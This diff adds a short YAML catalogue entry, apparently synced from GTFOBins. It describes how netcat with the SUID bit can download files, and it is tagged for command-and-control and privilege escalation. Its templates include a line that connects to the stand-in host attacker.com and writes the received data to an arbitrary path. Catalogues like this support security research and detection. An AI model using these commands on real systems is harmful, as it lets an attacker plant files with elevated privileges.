@@ -1,0 +1,27 @@
+id: gtfobins/nc/download/suid
+type: binary
+platform: linux
+name: nc
+phases:
+- command-and-control
+- privilege-escalation
+capabilities:
+- file-download
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: nc -l -p 12345 >/path/to/output-file
+  comment: The file is actually written by the invoking shell.
+- template: nc attacker.com 12345 >/path/to/output-file
+  comment: The file is actually written by the invoking shell.
+references:
+- https://gtfobins.github.io/gtfobins/nc/
+tags:
+- linux
+- unix
+- gtfobins
